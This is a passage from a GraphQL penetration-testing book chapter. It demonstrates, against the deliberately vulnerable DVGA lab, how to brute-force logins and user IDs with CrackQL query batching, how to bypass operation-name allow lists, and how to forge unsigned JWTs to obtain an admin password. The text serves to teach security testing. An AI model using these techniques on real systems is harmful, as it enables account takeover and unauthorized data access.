+<pre><code># <b>cd ~/CrackQL</b>
+# <b>python3 CrackQL.py -t http://localhost:5013/graphql -q sample-queries/login.graphql</b>
+<b>-i sample-inputs/usernames_and_passwords.csv --verbose</b></code></pre>
+<p>CrackQL comes preinstalled with a sample username and password CSV dictionary, as well as the <em>login.graphql</em> query, shown in <a href="#listing7-6" id="listinganchor7-6">Listing 7-6</a>. As you can see, it contains a single login mutation with two embedded variables, <code>username</code> and <code>password</code>. CrackQL uses Jinja-templating syntax, so variables are passed using double curly brackets (<code>{{}}</code>).</p>
+<pre><code>mutation {
+  login(username: {{username|str}}, password: {{password|str}}) {
+    accessToken
+   }
+}</code></pre>
+<p class="CodeListingCaption"><a id="listing7-6">Listing 7-6</a>: The sample CrackQL login brute-force query</p>
+<p>When you execute the CrackQL command, the tool will automatically take each username and password variable from the CSV file and inject them into a duplicated login operation in the same query document. CrackQL’s verbose output provides payload details, as well as the output results:</p>
+<pre><code>Data:
+[{'alias1': {'data': None,
+             'inputs': {'password': 'admin', 'username': 'admin'}}},
+<em>--snip--</em>
+
+ {'alias9': {'data': None,
+             'inputs': {'password': 'operator', 'username': 'pass123'}}},
+<span epub:type="pagebreak" id="Page_177" title="177"/> {'<b>alias10</b>': {'data': {'<b>accessToken</b>': '<b>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzIiwiaWF0IjoxNjU3MDQ2NjI5LCJuYmYiOjE2N</b>
+<b>TcwNDY2MjksImp0aSI6IjVkMzhkM2Y5LWNjNTUtNDcyYy1iNzRhLThiN2FlMzEyNGFlMiIsImlkZW50aXR5Ijoib3BlcmF0</b>
+<b>b3IiLCJleHAiOjE2NTcwNTM4Mjl9.Ba3zfvSZqjDmyLFdx71WCs-7vidaxpUfs2X3UK3zZBA'</b>},
+              'inputs': {'password': 'password123', 'username': 'operator'}}}]
+Errors:
+[{'alias1': {'error': 'Authentication Failure',
+             'inputs': {'password': 'admin', 'username': 'admin'}}},
+ {'alias2': {'error': 'Authentication Failure',
+             'inputs': {'password': 'admin', 'username': 'password'}}},
+<em>--snip--</em>
+
+ {'alias9': {'error': 'Authentication Failure',
+             'inputs': {'password': 'password123', 'username': 'operator'}}}]
+[*] Writing to directory results/localhost:5013_5bab6e</code></pre>
+<p>In cases where GraphQL query cost controls prevent the execution of large query batches, CrackQL has an optional <code>-b</code> (batch) argument, which you can use to define a more limited set of aliased operations, allowing your attack to fly under the radar.</p>
+<p>You could also use CrackQL for a variety of other attacks. Using a list of possible one-time password tokens, CrackQL could brute-force two-factor authentication. It can also perform account enumeration attacks, by automating the scanning for valid emails or usernames, or fuzz for unique object identifiers to exploit <em>insecure direct object reference (IDOR) </em>vulnerabilities, where, by directly referencing an object identifier, we are able to access the object without being authorized to do so.</p>
+<p>When performing attacks against authenticated queries, you’ll likely need to pass it authentication headers and possibly cookies. CrackQL allows you to do so using the <em>config.py</em> file, which accepts <code>COOKIES</code> and <code>HEADERS</code> variables. Here is an example of how to supply the tool with custom headers and cookies:</p>
+<pre><code># <b>cat config.py</b>
+
+HEADERS = {"Authorization": "Bearer mytoken"}
+COOKIES = {"session:"session-secret"}</code></pre>
+<p>When performing a penetration test, you can obtain these headers by inspecting the network traffic with tools such as the Firefox Developer Tools’ Network tab. Look at any GraphQL requests that are sent after you perform an initial login to a website. At that point, you should see unique authentication headers or session cookies.</p>
+<h3 id="h2-502840c07-0006"><a class="XrefDestination" id="UsingAllow-ListedOperationNames"/><span class="XrefDestination" id="xref-502840c07-019"/>Using Allow-Listed Operation Names</h3>
+<p class="BodyFirst">Certain in-band GraphQL implementations may make some queries and mutations publicly available for unauthenticated clients, such as those for login or account registration. Some of these deployments use <em>operation name-based allow lists</em>, a weak enforcement control, to reject all unauthenticated <span epub:type="pagebreak" id="Page_178" title="178"/>requests unless their operation names are in an allow list. However, operation names can be defined by the client, so an attacker can bypass these authentication mechanisms by simply spoofing an operation’s name.</p>
+<p>The following is an example of an unauthenticated mutation. As you can see, it would allow a user to register a new user account:</p>
+<pre><code>mutation RegisterAccount {
+    register(username: "operator", password: "password"){
+        user_id
+    }
+}</code></pre>
+<p>An implementation may choose to allow-list this <code>register</code> operation by using its operation name <code>RegisterAccount</code>. As attackers, we can take advantage of this by sending a request like the one in <a href="#listing7-7" id="listinganchor7-7">Listing 7-7</a>.</p>
+<pre><code>mutation RegisterAccount {
+    withdrawal(amount: 100.00, from: "ACT001", dest: "ACT002"){
+        confirmationCode
+    }
+}</code></pre>
+<p class="CodeListingCaption"><a id="listing7-7">Listing 7-7</a>: An example operation that could bypass authentication by using an allow-listed operation name</p>
+<p>We used the allowed operation name to withdraw money with a withdrawal mutation.</p>
+<h3 id="h2-502840c07-0007"><a class="XrefDestination" id="ForgingandLeakingJWTCredentials"/><span class="XrefDestination" id="xref-502840c07-020"/>Forging and Leaking JWT Credentials</h3>
+<p class="BodyFirst">While JWT tokens can be encrypted using JSON Web Encryption (RFC 7516), they often aren’t. And when they aren’t, they may leak sensitive data. For example, take a look at the payload section of the following:</p>
+<pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.<b>eyJ0eXBlIjoiYWNjZXNzIiwiaWF0IjoxNj</b>
+<b>U3MDQ2NjI5LCJuYmYiOjE2NTcwNDY2MjksImp0aSI6IjVkMzhkM2Y5LWNjNTUtNDcyYy1iN</b>
+<b>zRhLThiN2FlMzEyNGFlMiIsImlkZW50aXR5Ijoib3BlcmF0b3IiLCJleHAiOjE2NTcwNTM4</b>
+<b>MjksImFwaV90b2tlbiI6IkFQSV9TRUNSRVRfUEFTU1dPUkQifQ</b>.iIQ9zMRP2bA0Yx8p7INu
+rfC-PcVz3-KqfzEE4uQICbc</code></pre>
+<p>When we Base64-decode the payload, we discover a hardcoded credential, <code>api_token</code>, in the payload section:</p>
+<pre><code>{
+  "type": "access",
+  "iat": 1657046629,
+  "nbf": 1657046629,
+  "jti": "5d38d3f9-cc55-472c-b74a-8b7ae3124ae2",
+  "identity": "operator",
+  "exp": 1657053829,
+  <b>"api_token":"API_SECRET_PASSWORD"</b>
+}</code></pre>
+<p><span epub:type="pagebreak" id="Page_179" title="179"/>We can gain a lot of insight into an application by decoding and testing the contents of JWT tokens.</p>
+<p>Another way to bypass weak JWT authentication controls is by forging our own JWT tokens. If a GraphQL API fails to correctly verify the signature of a JWT token, it becomes vulnerable to forgery-based attacks, in which an attacker can encode their own user details.</p>
+<p>Let’s perform a JWT forgery attack against DVGA by forging the JWT token of an administrator. First, copy the <code>accessToken</code> JWT we received in <span class="xref" itemid="xref_target_“Brute-Forcing Passwords by Using Query Batching” on page 173">“Brute-Forcing Passwords by Using Query Batching” on page 173</span>, when we successfully brute-forced the <em>operator</em> password. We can verify that the <code>accessToken</code> is valid by sending it as a <code>token</code> argument in the <code>me</code> query operation in DVGA:</p>
+<pre><code>query {
+  me(token: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzIiwiaWF0Ij
+oxNjU3MDQ2NjI5LCJuYmYiOjE2NTcwNDY2MjksImp0aSI6IjVkMzhkM2Y5LWNjNTUtNDcyYy1iNzRhLT
+hiN2FlMzEyNGFlMiIsImlkZW50aXR5Ijoib3BlcmF0b3IiLCJleHAiOjE2NTcwNTM4Mjl9.Ba3zfvSZq
+jDmyLFdx71WCs-7vidaxpUfs2X3UK3zZBA"){
+    id
+    username
+    password
+  }
+}</code></pre>
+<p>DVGA will authenticate the user based on the identity claim in the JWT and use the <code>me</code> query operation to return the authenticated user object fields:</p>
+<pre><code>{
+  "data": {
+    "me": {
+      "id": "2",
+      "username": "operator",
+      "password": "******"
+    }
+  }
+}</code></pre>
+<p>Next, let’s paste the JWT string into <a class="LinkURL" href="https://jwt.io">https://jwt.io</a>, as shown in <a href="#figure7-3" id="figureanchor7-3">Figure 7-3</a>. This website will automatically decode and present the three JWT segments in a more human-readable form.</p>
+<p>In the right panel, we can directly modify the decoded payload’s JSON data, changing the <code>"identity": "operator"</code> line to <code>"identity": "admin"</code>. You’ll notice that <a class="LinkURL" href="https://jwt.io">https://jwt.io</a> will automatically encode the payload changes in the left panel.</p>
+<span epub:type="pagebreak" id="Page_180" title="180"/><figure>
+<img alt="" class="keyline" src="image_fi/502840c07/f07003.png"/>
+<figcaption><p><a id="figure7-3">Figure 7-3</a>: The DVGA operator’s <span class="LiteralInCaption"><code>accessToken</code></span>, decoded using <a class="LinkURL" href="https://jwt.io">https://jwt.io</a></p></figcaption>
+</figure>
+<p>Now try using this forged JWT token against the <code>me</code> operation. Simply copy the JWT and paste it into the query’s <code>token</code> argument. Because DVGA doesn’t verify the JWT signature, it will authenticate our request with the forged JWT token and return the admin user’s password:</p>
+<pre><code>{
+  "data": {
+    "me": {
+      "id": "1",
+      "username": "admin",
+      "password": "changeme"
+    }
+  }
+}</code></pre>
+<p>When a client changes a JWT token, its signature should become invalid. GraphQL APIs that don’t validate this signature by using their secret key will be prone to forgery-based attacks.</p>
+<h2 id="h1-502840c07-0003"><a class="XrefDestination" id="AuthorizationTesting"/><span class="XrefDestination" id="xref-502840c07-021"/>Authorization Testing</h2>
+<p class="BodyFirst">As with authentication, developers can take several approaches to implementing authorization. When given a limited GraphQL user account, we, as hackers, should see how far we can escalate our privileges. In particular, we should determine whether we’re able to bypass controls intended to prevent us from reading user data or performing certain elevated functions.</p>
+<p><span epub:type="pagebreak" id="Page_181" title="181"/>Like REST, GraphQL can be vulnerable to a variety of authorization attacks, depending on how the API handles permission controls. Failure to protect unauthorized access at the function level may result in the leakage of sensitive data or the execution of damaging operations.</p>
+<p>GraphQL-specific authorization flaws typically arise when permission checks occur at the resolver level or after the execution of any business logic or state changes. Let’s learn to detect some of these authorization approaches and explore the attacks to which they might be vulnerable.</p>
+<h3 id="h2-502840c07-0008"><a class="XrefDestination" id="DetectingtheAuthorizationLayer"/><span class="XrefDestination" id="xref-502840c07-022"/>Detecting the Authorization Layer</h3>
+<p class="BodyFirst">We can go about detecting whether an API uses authorization controls, and of what type, in several ways.</p>
+<h4 id="h3-502840c07-0010"><a class="XrefDestination" id="FindingSchemaDirectives"/><span class="XrefDestination" id="xref-502840c07-023"/>Finding Schema Directives</h4>
+<p class="BodyFirst">We mentioned earlier that developers sometimes implement authorization by using schema directives. You can identify these schema directives if you have access to the API’s SDL files. Alternatively, you can send a specialized introspection query, like the one in <a href="#listing7-8" id="listinganchor7-8">Listing 7-8</a>.</p>
+<pre><code>query {
+  __schema {
+    directives {
+      name
+      args {
+        name
+      }
+    }
+  }
+}</code></pre>
+<p class="CodeListingCaption"><a id="listing7-8">Listing 7-8</a>: An introspection query to fetch directive names and arguments</p>
+<p>Running this query will return a list of all the query- and schema-level directives in the target server. If you notice the <code>@auth</code> directive in the list, you can assume that the schema supports it. Of course, developers can call directives different things, so also look for names like <code>@authorize</code>, <code>@authorization</code>, <code>@authz</code>, and others.</p>
+<h4 id="h3-502840c07-0011"><a class="XrefDestination" id="FindingAuthDirectivesintheSchema"/><span class="XrefDestination" id="xref-502840c07-024"/>Finding Authentication Directives in the Schema</h4>
+<p class="BodyFirst">If we perform an introspection query to identify directives, we’ll know whether an <code>@auth</code> directive exists. However, we won’t know where this directive is applied in the schema, as this information isn’t exposed in an introspection query. That’s because clients don’t call schema-level directives; instead, developers use them to protect against unauthorized access, among other use cases.</p>
+<p><span epub:type="pagebreak" id="Page_182" title="182"/>Take a look at the <code>User</code> object type in <a href="#listing7-9" id="listinganchor7-9">Listing 7-9</a> as an example.</p>
+<pre><code>Type User {
+  id: ID
+  username: String
+  email: String
+  password: String @auth(requires: ADMIN)
+  role: String
+}</code></pre>
+<p class="CodeListingCaption"><a id="listing7-9">Listing 7-9</a>: An <code>@auth</code> directive usage example in a schema</p>
+<p>You’ll find scanning the schema for <code>@auth</code> directives useful in white-box penetration tests, which provide you with the SDL files. But in black-box tests that provide no access to the schema, you might know that the <code>password</code> field exists, for example, but not that the <code>@auth</code> directive applies to it.</p>
+<p>The GraphQL developer community has discussed exposing information about the use of schema-level directives in the introspection system. However, many GraphQL implementations currently don’t expose this information.</p>
+<h3 id="h2-502840c07-0009"><a class="XrefDestination" id="EnumeratingPathswithgraphql-path-enum"/><span class="XrefDestination" id="xref-502840c07-025"/>Enumerating Paths with graphql-path-enum</h3>
+<p class="BodyFirst">To test authorization controls, you should try accessing sensitive fields in as many ways as you can imagine. For example, consider the following excerpt from the DVGA’s schema, in which three queries access the <code>PasteObject</code>:</p>
+<pre><code>type Query {
+  pastes(public: Boolean, limit: Int, filter: String): [<b>PasteObject</b>]
+  paste(id: Int, title: String): <b>PasteObject</b>
+<var>--snip--</var>
+  users(id: Int): [UserObject]
+  readAndBurn(id: Int): <b>PasteObject</b>
+  search(keyword: String): [SearchResult]
+  audits: [AuditObject]
+  deleteAllPastes: Boolean
+  me(token: String): UserObject
+}</code></pre>
+<p>As a client, you could return information about pastes by using either <code>pastes</code>, <code>paste</code>, or <code>readAndBurn</code>. When implementing in-band authorization, a developer might accidentally protect only some of these queries. As such, determine all possible paths to a given object type.</p>
+<p>Schemas can be very large, so you’ll find it helpful to automate the process of identifying all paths to a given object type. For this task, we’ll use graphql-path-enum. This tool expects two important arguments: the introspection JSON response and the name of an object type we want to test for authorization issues. Let’s use it to find all paths to the <code>PasteObject</code> object type.</p>
+<p>First, run a full introspection query by pasting the query from <a class="LinkURL" href="https://github.com/dolevf/Black-Hat-GraphQL/blob/master/queries/introspection_query.txt">https://github.com/dolevf/Black-Hat-GraphQL/blob/master/queries/introspection_query.txt</a> into Altair. Send the request and copy the response to a file named <em>introspection.json</em>. Next, provide graphql-path-enum with this file and tell it to search for all paths leading to the <code>PasteObject</code> object, as shown in <a href="#listing7-10" id="listinganchor7-10">Listing 7-10</a>.</p>
+<pre><code><span epub:type="pagebreak" id="Page_183" title="183"/># <b>cd ~</b>
+# <b>./graphql-path-enum -i introspection.json -t PasteObject</b>
+
+Found 3 ways to reach the "PasteObject" node:
+- Query (pastes) -&gt; PasteObject
+- Query (paste) -&gt; PasteObject
+- Query (readAndBurn) -&gt; PasteObject</code></pre>
+<p class="CodeListingCaption"><a id="listing7-10">Listing 7-10</a>: Performing type path enumeration with graphql-path-enum</p>
+<p>As you can see, graphql-path-enum traversed the introspection response and identified all possible query paths to the object. Now we can manually send these three queries to see whether any of them grant access to objects that other queries don’t.</p>
+<p>If you’d like to practice schema traversal in a large, complex GraphQL API, try running graphql-path-enum against the <code>Vehicle</code> object type in the popular Star Wars API (SWAPI). This API’s schema is larger than that of the DVGA and should illustrate the importance of path enumeration when testing for authorization issues. You can access the SWAPI schema at <a class="LinkURL" href="https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch07/starwars-schema.json">https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch07/starwars-schema.json</a>.</p>
+<h3 id="h2-502840c07-0010"><a class="XrefDestination" id="Brute-ForcingArgumentsandFieldswithCrackQL"/><span class="XrefDestination" id="xref-502840c07-026"/>Brute-Forcing Arguments and Fields with CrackQL</h3>
+<p class="BodyFirst">Because graphql-path-enum works for only object types, you might try the field-stuffing technique discussed in <span class="xref" itemid="xref_target_Chapter 6">Chapter 6</span> to test for weak or nonexistent authorization controls intended to limit the amount of data an unprivileged user can view. We can also use CrackQL to programmatically brute-force arguments and fields to which we shouldn’t have access. Imagine a query that looks like the following:</p>
+<pre><code>query {
+  users(id: 1) {
+    username
+    password
+  }
+}</code></pre>
+<p>Now, say that accessing information about certain users requires special authorization permissions. We know that the user IDs are numerical and incremental, but not which are protected. Let’s attempt to brute-force them all with CrackQL.</p>
+<p>In the CrackQL folder, under <em>sample-queries</em>, create a new file named <em>users.graphql</em> with the following content:</p>
+<pre><code><b>query {</b>
+<b>  users(id: {{id|int}}) {</b>
+<b>     username</b>
+<b>     password</b>
+<b>   }</b>
+<b>}</b></code></pre>
+<p><span epub:type="pagebreak" id="Page_184" title="184"/>This query uses the <code>users</code> field with an <code>id</code> parameter of the <code>Int</code> type. Because the query takes an <code>id</code> argument, we can attempt to enumerate accounts by incrementally supplying a list of numerical user identifiers. CrackQL will render the <code>{{id|int}}</code> string and replace it with words from a wordlist we will create next.</p>
+<p>Let’s create this dictionary of possible user IDs as a one-column CSV wordlist. Such a list is easy to generate with some Bash-fu:</p>
+<pre><code># <b>cd ~/CrackQL</b>
+# <b>echo "id" &gt; sample-inputs/users.csv</b>
+# <b>for id in `seq 1 100`; do echo $id &gt;&gt; sample-inputs/users.csv; done</b></code></pre>
+<p>Next, check that the file was generated properly by printing the first five lines:</p>
+<pre><code># <b>head -5 sample-inputs/users.csv</b>
+
+id
+1
+2
+3
+4</code></pre>
+<p>Now run CrackQL to find valid user IDs and retrieve their username and password fields:</p>
+<pre><code># <b>python3 CrackQL.py -t http://localhost:5013/graphql -q sample-queries/users.graphql</b>
+<b>-i sample-inputs/users.csv --verbose</b>
+
+[+] Verifying Payload Batch Operation...
+[+] Sending Alias Batch 1 of 1 to http://localhost:5013/graphql...
+===============================
+Results:
+
+Data:
+[{'alias1': {'data': [{'password': '******', 'username': 'admin'}],
+             'inputs': {'id': '120'}}},
+ {'alias2': {'data': [{'password': '******', 'username': 'operator'}],
+             'inputs': {'id': '120'}}},
+ {'alias3': {'data': [], 'inputs': {'id': '120'}}},</code></pre>
+<p>You can also, in the same fashion, brute-force fields that you suspect you won’t be able to access because of authorization controls by simply modifying the original query to include these potential fields:</p>
+<pre><code>query {
+  users(id: {{id|int}}) {
+     username
+     password
+<b>     accessToken</b>
+<span epub:type="pagebreak" id="Page_185" title="185"/><b>     birthDate</b>
+<b>     location</b>
+   }
+}</code></pre>
+<p>CrackQL will save the output of all attempts under the <em>~/CrackQL/results</em> folder. If these fields are accessible, you’ll see the responses to them there.</p>
+<h2 id="h1-502840c07-0004"><a class="XrefDestination" id="Summary"/><span class="XrefDestination" id="xref-502840c07-027"/>Summary</h2>
+<p class="BodyFirst">In this chapter, you learned about in-band and out-of-band GraphQL authentication and authorization architectural models. We reviewed a few traditional controls developers may have adopted in their GraphQL deployments and called out the weaknesses to which they might be susceptible. For example, GraphQL implementations that use JWT tokens might be vulnerable to token forging. We also directed your attention to newer, GraphQL-specific authentication and authorization libraries and plug-ins, such as GraphQL Modules, GraphQL Shield, and custom schema directives.</p>
+<p>By taking advantage of GraphQL features like alias-based query batching, we can brute-force in-band authentication operations manually or use CrackQL to do this automatically. Using graphql-path-enum, we can enumerate paths to types, and using CrackQL once again, we can potentially access fields without proper authorization controls.</p>
+<p>In the next chapter, we’ll turn to another age-old vulnerability class: injections, which continue to wreak havoc even against modern API services like GraphQL.</p>
+</section>
+</body>
+</html>
